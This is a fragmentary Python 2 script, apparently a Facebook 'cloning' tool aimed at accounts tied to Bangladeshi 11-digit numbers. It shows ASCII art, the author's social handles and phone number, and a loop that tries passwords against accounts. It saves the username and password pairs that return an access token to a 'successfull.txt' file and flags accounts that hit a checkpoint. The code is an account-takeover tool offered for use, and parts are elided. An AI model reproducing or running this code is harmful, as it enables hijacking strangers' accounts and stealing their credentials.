...
psb('\x1b[1;32mBANGLADESH 11 DIGIT CLONING TOOL IS STARTING PLEASE WAIT ..........')
for n in range(7777):
...
< IQUBAL >
 --------
  ...
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$        :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#         $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"               "*$bd$$$$      '*$$$$$$$$$$$o+#"                       """"          """""""                   _____         _____  _  __          _____
...
print 'FACEBOOK : sarkar.saheb420'
print 'GITHUB : IQUBAL420'
...
os.system('xdg-open https://www.facebook.com/sarkar.saheb420/?ref=share')
...
def menu():
    ...
    print
    jalan('\x1b[1;90m[8] WarningðŸ‘‰ incorrect Pass Try To 11digit ')
    jalan('\x1b[1;90m[9] TO CONTACT +8801843933402')
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[OK-SARKAR-SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + c + pass1 + '\n')
                okb.close()
                oks.append(c + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[CP-SARKAR-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 7 Days]\n'
